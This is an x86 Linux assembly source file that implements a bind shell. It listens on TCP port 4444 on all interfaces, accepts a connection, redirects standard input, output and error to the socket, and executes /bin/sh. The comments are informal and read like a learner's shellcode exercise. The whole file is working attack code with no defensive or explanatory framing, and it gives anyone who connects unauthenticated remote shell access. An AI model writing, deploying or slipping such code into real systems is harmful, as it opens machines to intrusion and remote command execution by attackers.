section .data
    AF_INET EQU 2 ; IPv4
    INADDR_ANY EQU 0x00000000 ; THIS CONSTANT MEANS WE ARE NOR GOING TO HAVE SPECIFIC IP ADDRESS
    PATH DB '/bin/sh', 0
    ARG0 DB 'sh', 0
    
section .bss
    SOCKADDR_IN RESB 16 ; SOCKADDR_IN VALUE FOR BINDING AND ACCEPTING
    ADDRLEN RESD 1 ; ADDRLEN PARAMETER

section .text
    global _start
    
_start:
    ; RESETTING REGISTERS
    XOR EAX, EAX
    MOV EBX, EAX
    MOV ECX, EAX
    MOV ESI, EAX ; PRESERVE SOCKFD
    MOV EDI, EAX ; PRESERVE CLIENT FD
    
    MOV EAX, 0x66 ; SOCKET CALL
    MOV EBX, 1
    PUSH 0 ; 0
    PUSH 1 ; SOCK_STREAM
    PUSH 2 ; AF_INET
    
    MOV ECX, ESP
    INT 0x80 ; socket()
    
    CMP EAX, 0
    JL _error     
   
    MOV ESI, EAX ; PRESERVE

    ; NOW ECI STORES THE SOCKFD
    XOR EAX, EAX ; RESET EAX 
    MOV EAX, 0x66 ; BIND CALL
    MOV EBX, 2; BIND    

    ; TOTAL 8 BYTE PG DATA 8 BYTE OF PADDING
    MOV ECX, SOCKADDR_IN
    MOV BYTE [ECX], AF_INET
    MOV WORD [ECX + 2], 0x5C11 ; htons(4444)
    MOV DWORD [ECX + 4], INADDR_ANY
    
    PUSH 16 ; SOCKADDR_IN SIZE
    MOV EDX, ESP ; POINTER TO 16 PROBABLY DOESNT GET USED BUT I PUT IT
    PUSH ECX
    PUSH ESI
    MOV ECX, ESP    

    INT 0x80
    
    CMP EAX, 0
    JL _error
  
    ; RESET EAX PREOPARE FOR LISTEN()
    XOR EAX, EAX
    MOV EAX, 0x66 ; LISTEN CALL
    
    ; CHANGE THE MEMORY LOCATION OF ECX AND RESET
    PUSH 10 ; BACKLOG WHICH MEANS 10 CONNECTIONS MOST     
        
    PUSH ESI ; PUSH SOCKFD
    MOV EBX, 4 ; -> LISTEN -> 4
    MOV ECX, ESP

    INT 0x80
    
    CMP EAX, 0
    JL _error      
    
    ; ITS TIME TO ACCEPT()
    XOR EAX, EAX
    MOV EAX, 0x66 ; ACCEPT CALL
    MOV EBX, 5 ; ACCEPT -> 5
    
    MOV DWORD [ADDRLEN], 16 ; WRITE ADDRES LENGTH

    PUSH ADDRLEN ; PUSHING IT INTO STACK
    MOV EDX, ESP

    PUSH SOCKADDR_IN ; THIS IS FOR GETTING CLIENTFD

    PUSH ESI ; OUR SOCKFD
    
    MOV ECX, ESP ; MAKING ECX SHOW PARAMETERS
    INT 0x80
    
    MOV EDI, EAX ; CLIENT SOCKET

    CMP EAX, 0
    JL _error      
    
    ; CLOSE SOCKFD CUZ THERE IS NOTHING TO WITH THAT AFTER ACCEPTING
    XOR EAX, EAX
    MOV EAX, 0x06 ; CLOSE CALL
    MOV EBX, ESI
    INT 0x80

    CMP EAX, 0
    JL _error      

    ; DUP2 
    XOR EAX, EAX
    
    ; JUST GETS THE STDIN, STDOUT, STDERR DATA STREAMS
    MOV EAX, 0x3F
    MOV EBX, EDI ; LOAD CLIENTFD INTO EBX
    XOR ECX, ECX
    MOV ECX, 0
    INT 0x80
    
    MOV EAX, 0x3F
    MOV EBX, EDI ; LOAD CLIENTFD INTO EBX
    XOR ECX, ECX
    MOV ECX, 1
    INT 0x80

    MOV EAX, 0x3F
    MOV EBX, EDI ; LOAD CLIENTFD INTO EBX
    XOR ECX, ECX
    MOV ECX, 2
    INT 0x80

    CMP EAX, 0
    JL _error 
 
    ; EXECVE -> THIS RUNS BASH TERMINAL
    XOR EAX, EAX
    PUSH EAX ; NULL TERM

    MOV EAX, ARG0
    PUSH EAX
    XOR EAX, EAX     
    
    MOV ECX, ESP    
    MOV EBX, PATH
  
    XOR EDX, EDX     
    MOV EAX, 0x0B ; EXECVE CALL
    INT 0x80        

    ; CLOSE CLIENTFD
    MOV EBX, EDI ; CLIENTFD
    MOV EAX, 0x06
    INT 0x80
     
    CMP EAX, 0
    JL _error      
    
    ; CLOSE
    MOV EAX, 1
    XOR EBX, EBX
    INT 0x80

_error:
    MOV EAX, 1    
    MOV EBX, 1        
    INT 0x80
